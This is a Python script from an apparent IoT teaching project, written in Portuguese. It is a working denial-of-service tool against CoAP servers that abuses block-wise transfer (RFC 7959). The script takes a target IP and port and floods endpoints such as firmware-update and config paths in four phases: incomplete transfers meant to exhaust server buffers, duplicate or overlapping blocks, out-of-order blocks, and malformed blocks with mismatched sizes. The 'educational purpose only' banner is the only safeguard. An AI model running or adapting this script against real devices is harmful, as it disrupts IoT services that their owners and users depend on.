#!/usr/bin/env python3
"""
CoAP Block-Wise Transfer Fragmentation Attack
Envia fragmentos malformados para exaurir servidor
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *
import random

attack_stats = {
    'incomplete_transfers': 0,
    'overlapping_blocks': 0,
    'out_of_order_blocks': 0,
    'malformed_blocks': 0,
    'errors': 0
}

class BlockFragmentAttacker:
    def __init__(self, target_host, target_port):
        self.target = f"coap://{target_host}:{target_port}"
    
    async def incomplete_block_transfer(self, transfer_id, resource):
        """Inicia transferência block-wise mas nunca completa"""
        try:
            protocol = await Context.create_client_context()
            
            uri = f"{self.target}{resource}"
            
            # Payload grande (vai ser fragmentado)
            large_payload = b"X" * 2048  # 2KB de dados
            
            # Envia primeiro bloco
            request = Message(
                code=PUT,
                uri=uri,
                payload=large_payload[:64],  # Primeiro bloco de 64 bytes
            )
            request.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(0, 1, 64)
            
            response = await protocol.request(request).response
            
            print(f"[!] Transfer {transfer_id:04d}: Bloco 0 enviado para {resource}")
            print(f"    └─> Transferência NUNCA será completada (exaure buffer)")
            
            attack_stats['incomplete_transfers'] += 1
            
            # NÃO envia blocos subsequentes - servidor fica esperando!
            
        except Exception as e:
            attack_stats['errors'] += 1
            print(f"[✗] Erro em transfer {transfer_id}: {e}")
    
    async def overlapping_blocks_attack(self, attack_id, resource):
        """Envia blocos sobrepostos/duplicados"""
        try:
            protocol = await Context.create_client_context()
            uri = f"{self.target}{resource}"
            
            payload_block = b"OVERLAP" * 10
            
            # Envia bloco 0
            request1 = Message(code=PUT, uri=uri, payload=payload_block)
            request1.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(0, 1, 64)
            await protocol.request(request1).response
            
            # Envia bloco 0 NOVAMENTE (duplicado)
            request2 = Message(code=PUT, uri=uri, payload=payload_block)
            request2.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(0, 1, 64)
            await protocol.request(request2).response
            
            # Envia bloco 1 que sobrepõe bloco 0
            request3 = Message(code=PUT, uri=uri, payload=payload_block)
            request3.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(1, 1, 64)
            await protocol.request(request3).response
            
            print(f"[!] Attack {attack_id:04d}: Blocos sobrepostos enviados")
            attack_stats['overlapping_blocks'] += 1
            
        except Exception as e:
            attack_stats['errors'] += 1
    
    async def out_of_order_blocks(self, attack_id, resource):
        """Envia blocos fora de ordem"""
        try:
            protocol = await Context.create_client_context()
            uri = f"{self.target}{resource}"
            
            payload = b"OUTOFORDER" * 10
            
            # Envia blocos na ordem: 2, 0, 3, 1
            block_order = [2, 0, 3, 1]
            
            for block_num in block_order:
                request = Message(code=PUT, uri=uri, payload=payload)
                more = 1 if block_num < 3 else 0
                request.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(block_num, more, 64)
                await protocol.request(request).response
                await asyncio.sleep(0.1)
            
            print(f"[!] Attack {attack_id:04d}: Blocos fora de ordem (2,0,3,1)")
            attack_stats['out_of_order_blocks'] += 1
            
        except Exception as e:
            attack_stats['errors'] += 1
    
    async def malformed_blocks(self, attack_id, resource):
        """Envia blocos malformados"""
        try:
            protocol = await Context.create_client_context()
            uri = f"{self.target}{resource}"
            
            # Bloco com tamanho inconsistente
            request = Message(code=PUT, uri=uri, payload=b"X" * 100)
            request.opt.block1 = optiontypes.BlockOption.BlockwiseTuple(0, 1, 16)  # Diz 16 bytes mas envia 100
            
            await protocol.request(request).response
            
            print(f"[!] Attack {attack_id:04d}: Bloco malformado enviado")
            attack_stats['malformed_blocks'] += 1
            
        except Exception as e:
            attack_stats['errors'] += 1
    
    async def launch_attack(self):
        """Lança todos os tipos de ataques de fragmentação"""
        
        resources = [
            "/api/upload",
            "/firmware/update",
            "/config/set",
            "/data/store",
        ]
        
        print("\n[*] Iniciando CoAP Block Fragmentation Attack...\n")
        
        tasks = []
        
        # 1. Transferências incompletas (50)
        print("[*] Fase 1: Transferências incompletas (buffer exhaustion)")
        for i in range(50):
            resource = random.choice(resources)
            task = self.incomplete_block_transfer(i, resource)
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        # 2. Blocos sobrepostos (30)
        print("\n[*] Fase 2: Blocos sobrepostos/duplicados")
        for i in range(30):
            resource = random.choice(resources)
            task = self.overlapping_blocks_attack(i, resource)
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        # 3. Blocos fora de ordem (30)
        print("\n[*] Fase 3: Blocos fora de ordem")
        for i in range(30):
            resource = random.choice(resources)
            task = self.out_of_order_blocks(i, resource)
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        # 4. Blocos malformados (20)
        print("\n[*] Fase 4: Blocos malformados")
        for i in range(20):
            resource = random.choice(resources)
            task = self.malformed_blocks(i, resource)
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        print("\n" + "=" * 70)
        print("[✓] CoAP Block Fragmentation Attack Completado!")
        print("=" * 70)
        print(f"[✓] Transferências incompletas: {attack_stats['incomplete_transfers']}")
        print(f"[✓] Blocos sobrepostos: {attack_stats['overlapping_blocks']}")
        print(f"[✓] Blocos fora de ordem: {attack_stats['out_of_order_blocks']}")
        print(f"[✓] Blocos malformados: {attack_stats['malformed_blocks']}")
        print(f"[✗] Erros: {attack_stats['errors']}")
        print("=" * 70)

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 70)
    print("  CoAP BLOCK FRAGMENTATION ATTACK - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Alvo: {target_host}:{target_port}")
    print(f"[*] Técnica: Block-Wise Transfer Abuse (RFC 7959)")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    attacker = BlockFragmentAttacker(target_host, target_port)
    await attacker.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())